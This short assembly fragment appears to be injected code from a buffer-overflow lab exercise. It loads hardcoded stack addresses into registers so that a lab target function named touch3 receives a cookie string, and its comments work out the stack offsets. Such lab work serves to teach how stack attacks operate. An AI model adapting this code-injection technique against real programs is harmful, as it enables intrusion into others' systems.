movq $0x556154f0,%rdi  # move cookie to rsp(non stepi's) + 8 bytes for return address of rsp + 8 bytes for touch3 = 0x98
movq $0x556154f9,%rsi  # move rdi+0x9 to rsi(stores sum array)
retq

